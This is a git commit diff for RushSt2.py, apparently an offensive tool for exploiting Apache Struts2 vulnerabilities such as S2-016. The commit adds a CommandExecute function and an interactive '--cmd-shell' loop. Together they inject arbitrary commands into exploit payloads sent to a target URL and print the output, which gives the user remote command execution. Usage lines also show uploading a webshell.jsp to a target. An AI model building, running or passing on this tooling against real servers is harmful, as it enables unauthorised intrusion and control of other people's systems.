d6665b234642b7910a2cc2e586e63429fd157637
eastrd <yjia285@student.monash.edu>
2016-07-21 16:43:58 +1000

    Update
    Created a cmd-shell feature

--- RushSt2.py
+++ RushSt2.py
@@ -12,9 +12,8 @@ This script is still in development...
 RushSt2.py -u www.abcdefg.com/login.action
 RushSt2.py -f url_list.txt
 RushSt2.py -u www.abcdefg.com/login.action -e S2-016
-RushSt2.py -u www.abcdefg.com/login.action -m POST
 RushSt2.py -u www.abcdefg.com/login.action --upload C:/webshell.jsp
-RushSt2.py -u www.abcdefg.com/login.action --cmd-shell
+RushSt2.py -u www.abcdefg.com/login.action -e s2-016 --cmd-shell
 '''
 import requests
 from ExpLib import ExpList
@@ -65,6 +64,14 @@ def exploit(TargetURL, ExpVersion, HTTPMethod):
 		print(PoC_Sniper(TargetURL, ExpVersion, HTTPMethod))
 
 
+
+def CommandExecute(TargetURL, ExpVersion, Command):
+	payload = ExpList[ExpVersion]["CMD"].replace("***CMD***", Command)
+	result = requests.get(TargetURL+payload).content.decode("utf-8").strip()
+	#Make the result clean by removing non-ASCII characters
+	return result.rstrip(' \t\r\n\0')
+
+
 #Initialise Exploit Database
 initAvailableExp()
 
@@ -74,13 +81,15 @@ if __name__ == "__main__":
 	parser.add_argument("-e","--exploit", help="Exploit Version Choice ( default: Scan for all )")
 	parser.add_argument("-m","--method", help="HTTP Method: [GET / POST] ( default: GET )")
 	parser.add_argument("--file-upload", help="File Upload")
-	parser.add_argument("--cmd-shell", help="Bounces back a command shell")
+	parser.add_argument("--cmd-shell", help="Bounces back a command shell", action='store_true')
 	args = vars(parser.parse_args())
+
 	#--URL: Add protocol prefix
 	if "http://" not in args["url"] and "https://" not in args["url"]:
 		TargetURL = "http://" + args["url"]
 	else:
 		TargetURL = args["url"]
+
 	#Check if argument "Method" has been set, defaults to GET Method
 	if args["method"] == None or args["method"] == "GET":
 		HTTPMethod = "GET"
@@ -89,6 +98,7 @@ if __name__ == "__main__":
 	else:
 		print("HTTP Method not Supported. Use GET or POST")
 		exit()
+
 	#--EXPLOIT
 	if args["exploit"] == None:
 		#If the Exploit option is not set
@@ -99,9 +109,22 @@ if __name__ == "__main__":
 		print("Exploit not found in database!")
 		exit()
 
+	#--CMD-SHELL
+	if args["cmd_shell"] == True:
+		#Check if there exists a specific exploit, i.e. if the exploit has been set by user
+		if ExpVersion != "ALL" and ExpVersion != "":
+			command = ""
+			while True:
+				command = input("\n->")
+				if command.upper() == "EXIT" or command.upper() == "QUIT":
+					break
+				else:
+					print(CommandExecute(TargetURL, ExpVersion, command))
 
-	print("\nAll Set:\n\tTarget URL:\t%s\n\tHTTP Method:\t%s\n\tExploit:\t%s\n\n" %(TargetURL,HTTPMethod,ExpVersion))
-
-	exploit(TargetURL, ExpVersion, HTTPMethod)
-
-	print("\n"*2)
+		else:
+			print("Please set a specific exploit version before using command shell.")
+	else:
+		#If --cmd-shell flag is set, don't need to go through the scanning process
+		print("\nAll Set:\n\tTarget URL:\t%s\n\tHTTP Method:\t%s\n\tExploit:\t%s\n\n" %(TargetURL,HTTPMethod,ExpVersion))
+		exploit(TargetURL, ExpVersion, HTTPMethod)
+		print("\n"*2)
